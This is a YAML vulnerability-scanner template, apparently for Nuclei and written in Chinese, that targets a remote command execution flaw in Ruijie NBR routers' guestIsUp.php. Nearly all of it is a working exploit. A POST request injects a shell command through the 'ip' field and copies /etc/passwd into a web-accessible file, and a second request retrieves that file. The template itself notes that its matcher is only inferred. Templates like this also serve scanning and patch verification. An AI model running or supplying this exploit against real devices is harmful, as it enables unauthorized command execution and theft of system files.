id: poc-422e2e093505008b9056
info:
  name: 锐捷NBR路由器guestIsUp.php远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/422e2e093505008b9056b15d5cc3c031

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 422e2e093505008b9056b15d5cc3c031
http:
- raw:
  - 'POST /guest_auth/guestIsUp.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0

    Connection: close

    Content-Length: 45

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip, deflate


    mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /guest_auth/test.txt HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36

    Connection: close

    Accept-Encoding: gzip, deflate'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
